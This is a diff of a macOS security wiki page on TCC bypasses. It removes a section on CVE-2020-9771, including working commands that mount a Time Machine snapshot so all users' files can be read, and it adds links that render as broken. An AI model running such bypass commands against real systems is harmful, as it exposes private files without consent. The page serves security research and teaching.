@@ -175,35 +175,6 @@ The extended attribute `com.apple.macl` **can’t be cleared** like other extend
 
 ## Bypasses
 
-### CVE-2020-9771 - mount\_apfs TCC bypass and privilege escalation
-
-**Any user** (even unprivileged ones) can create and mount a time machine snapshot an **access ALL the files** of that snapshot.\
-The **only privileged** needed is for the application used (like `Terminal`) to have **Full Disk Access** (FDA) access (`kTCCServiceSystemPolicyAllfiles`) which need to be granted by an admin.
-
-{% code overflow="wrap" %}
-```bash
-# Create snapshot
-tmutil localsnapshot
-
-# List snapshots
-tmutil listlocalsnapshots /
-Snapshots for disk /:
-com.apple.TimeMachine.2023-05-29-001751.local
-
-# Generate folder to mount it
-cd /tmp # I didn it from this folder
-mkdir /tmp/snap
-
-# Mount it, "noowners" will mount the folder so the current user can access everything
-/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap
-
-# Access it
-ls /tmp/snap/Users/admin_user # This will work
-```
-{% endcode %}
-
-A more detailed explanation can be [**found in the original report**](https://theevilbit.github.io/posts/cve\_2020\_9771/)**.**
-
 ### Write Bypass
 
 This is not a bypass, it's just how TCC works: **It doesn't protect from writing**. If Terminal **doesn't have access to read the Desktop of a user it can still write into it**:
@@ -277,6 +248,12 @@ exploit_location]; task.standardOutput = pipe;
 
 An app with the **`kTCCServiceAppleEvents`** permission will be able to **control other Apps**. This means that it could be able to **abuse the permissions granted to the other Apps**.
 
+For more info about Apple Scripts check:
+
+{% content-ref url="broken-reference" %}
+[Broken link](broken-reference)
+{% endcontent-ref %}
+
 For example, if an App has **Automation permission over `iTerm`**, for example in this example **`Terminal`** has access over iTerm:
 
 <figure><img src="../../.gitbook/assets/image (2) (2) (1).png" alt=""><figcaption></figcaption></figure>
@@ -317,9 +294,17 @@ end tell
 do shell script "rm " & POSIX path of (copyFile as alias)
 ```
 
-### Code Injection Bypass
+### Process Abuse
 
-I you manage to **inject code in a process** you will be able to abuse the TCC permissions of that process. See some examples in the following sections:
+I you manage to **inject code in a process** you will be able to abuse the TCC permissions of that process.&#x20;
+
+Check process abuse techniques in the following page:
+
+{% content-ref url="broken-reference" %}
+[Broken link](broken-reference)
+{% endcontent-ref %}
+
+See some examples in the following sections:
 
 ### CVE-2020-29621 - Coreaudiod
 
